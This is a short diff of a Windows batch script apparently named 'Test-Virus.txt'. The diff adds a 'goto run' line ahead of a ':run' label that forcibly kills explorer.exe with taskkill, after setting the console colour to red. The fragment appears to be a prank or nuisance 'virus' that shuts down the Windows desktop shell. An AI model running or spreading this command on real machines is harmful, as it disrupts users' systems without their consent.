@@ -3,6 +3,8 @@ cls
 
 color 4
 
+goto run
+
 :run
 taskkill /f /im explorer.exe
 Test-Virus.txt
